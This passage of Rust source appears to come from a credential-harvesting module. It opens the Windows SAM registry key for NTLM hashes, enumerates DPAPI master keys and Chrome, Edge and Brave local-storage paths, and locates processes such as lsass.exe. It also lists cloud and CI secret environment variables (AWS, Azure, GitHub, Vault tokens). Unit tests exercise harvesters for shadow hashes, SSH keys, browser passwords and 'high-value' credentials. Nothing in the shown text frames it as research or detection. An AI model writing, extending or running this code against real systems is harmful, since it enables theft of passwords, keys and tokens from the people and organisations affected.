                domain: "windows".into(),
                data: "SAM registry key opened (NTLM extraction requires SYSTEM privileges)".into(),
                source_process: "lsass.exe".into(),
                priority: 9,
            });
            winapi::um::winreg::RegCloseKey(hkey);
        } else {
            // Try alternate path
            let sam_path2 = r"SAM\SAM\Domains\Account";
            let wide2: Vec<u16> = OsStr::new(sam_path2).encode_wide().chain(Some(0)).collect();
            let mut hkey2: *mut HKEY__ = std::ptr::null_mut();
            let ret2 = RegOpenKeyExW(HKEY_LOCAL_MACHINE, wide2.as_ptr(), 0, KEY_READ, &mut hkey2);
            if ret2 == 0 && !hkey2.is_null() {
                creds.push(LeechHarvest {
                    credential_type: CredType::NTLMHash,
                    username: "sam_users".into(),
                    domain: "windows".into(),
                    data: "SAM\\SAM\\Domains\\Account opened — NTLM hashes accessible".into(),
                    source_process: "lsass.exe".into(),
                    priority: 9,
                });
                winapi::um::winreg::RegCloseKey(hkey2);
            }
        }
    }
    creds
}

#[cfg(target_os = "windows")]
fn harvest_dpapi() -> Vec<LeechHarvest> {
    let mut creds = Vec::new();
    if let Ok(appdata) = std::env::var("APPDATA") {
        let protect_dir = std::path::Path::new(&appdata).join("Microsoft").join("Protect");
        if protect_dir.exists() {
            if let Ok(entries) = std::fs::read_dir(&protect_dir) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_file() && path.extension().and_then(|e| e.to_str()) == Some("") {
                        let name = path.file_name().unwrap_or_default().to_string_lossy().to_string();
                        creds.push(LeechHarvest {
                            credential_type: CredType::AccessToken,
                            username: name,
                            domain: "dpapi".into(),
                            data: format!("DPAPI master key: {}", path.display()),
                            source_process: "dpapi".into(),
                            priority: 7,
                        });
                    }
                }
            }
        }
    }
    if let Ok(localappdata) = std::env::var("LOCALAPPDATA") {
        for browser_dir in &["Google\\Chrome\\User Data\\Default\\Local Storage",
                              "Microsoft\\Edge\\User Data\\Default\\Local Storage",
                              "BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage"] {
            let path = std::path::Path::new(&localappdata).join(browser_dir);
            if path.exists() {
                creds.push(LeechHarvest {
                    credential_type: CredType::BrowserPassword,
                    username: "browser_storage".into(),
                    domain: "dpapi".into(),
                    data: format!("Browser local storage accessible: {}", path.display()),
                    source_process: "browser".into(),
                    priority: 5,
                });
            }
        }
    }
    creds
}

#[cfg(target_os = "windows")]
fn find_process_pid(name: &str) -> u32 {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    let wide: Vec<u16> = OsStr::new(name).encode_wide().chain(Some(0)).collect();
    unsafe {
        let snapshot = winapi::um::tlhelp32::CreateToolhelp32Snapshot(
            winapi::um::tlhelp32::TH32CS_SNAPPROCESS,
            0,
        );
        if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
            return 0;
        }
        let mut pe: winapi::um::tlhelp32::PROCESSENTRY32W = std::mem::zeroed();
        pe.dwSize = std::mem::size_of::<winapi::um::tlhelp32::PROCESSENTRY32W>() as u32;
        if winapi::um::tlhelp32::Process32FirstW(snapshot, &mut pe) != 0 {
            loop {
                if pe.szExeFile == wide[..wide.len()-1] {
                    let pid = pe.th32ProcessID;
                    winapi::um::handleapi::CloseHandle(snapshot);
                    return pid;
                }
                if winapi::um::tlhelp32::Process32NextW(snapshot, &mut pe) == 0 {
                    break;
                }
            }
        }
        winapi::um::handleapi::CloseHandle(snapshot);
    }
    0
}

// ── helpers ──────────────────────────────────────────────────────────────────

fn _sensitive_env_vars() -> Vec<&'static str> {
    vec![
        "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
        "GOOGLE_APPLICATION_CREDENTIALS", "AZURE_CLIENT_SECRET", "AZURE_TENANT_ID",
        "GITHUB_TOKEN", "GITLAB_TOKEN", "DOCKER_API_TOKEN", "SLACK_TOKEN",
        "DIGITALOCEAN_TOKEN", "LINODE_TOKEN", "VAULT_TOKEN",
        "DATADOG_API_KEY", "NEW_RELIC_LICENSE_KEY", "CF_API_TOKEN",
        "ARM_CLIENT_SECRET", "ARM_SUBSCRIPTION_ID",
    ]
}

// ── tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_harvest_shadow() {
        let creds = harvest_shadow();
        // May be empty if not root, but shouldn't crash
        for c in &creds {
            assert_eq!(c.credential_type, CredType::ShadowHash);
        }
    }

    #[test]
    fn test_harvest_ssh_keys() {
        let creds = harvest_ssh_keys();
        // Should find keys if ~/.ssh exists
        for c in &creds {
            assert!(c.credential_type == CredType::SSHKey);
        }
    }

    #[test]
    fn test_harvest_cloud_tokens_no_panic() {
        let creds = harvest_cloud_tokens();
        // Should not crash regardless of environment
        for c in &creds {
            assert!(matches!(c.credential_type,
                CredType::CloudTokenAWS | CredType::CloudTokenGCP |
                CredType::CloudTokenAzure | CredType::CloudTokenK8s
            ));
        }
    }

    #[test]
    fn test_harvest_kerberos_tickets() {
        let _creds = harvest_kerberos_tickets();
        // Won't fail if no tickets, just empty
    }

    #[test]
    fn test_harvest_cached_credentials() {
        let creds = harvest_cached_credentials();
        for c in &creds {
            assert_eq!(c.credential_type, CredType::ClearTextPassword);
            assert!(c.priority >= 8);
        }
    }

    #[test]
    fn test_harvest_browser_passwords() {
        let creds = harvest_browser_passwords();
        for c in &creds {
            assert_eq!(c.credential_type, CredType::BrowserPassword);
        }
    }

    #[test]
    fn test_harvest_vault_tokens() {
        let creds = harvest_vault_tokens();
        for c in &creds {
            assert!(matches!(c.credential_type, CredType::VaultToken | CredType::GnupgKey));
        }
    }

    #[test]
    fn test_harvest_all_runs() {
        let _creds = harvest_all();
        // Just ensure it runs without panic
    }

    #[test]
    fn test_harvest_high_value() {
        let creds = harvest_high_value();
        for c in &creds {
            assert!(c.priority >= 8);
        }
    }
}
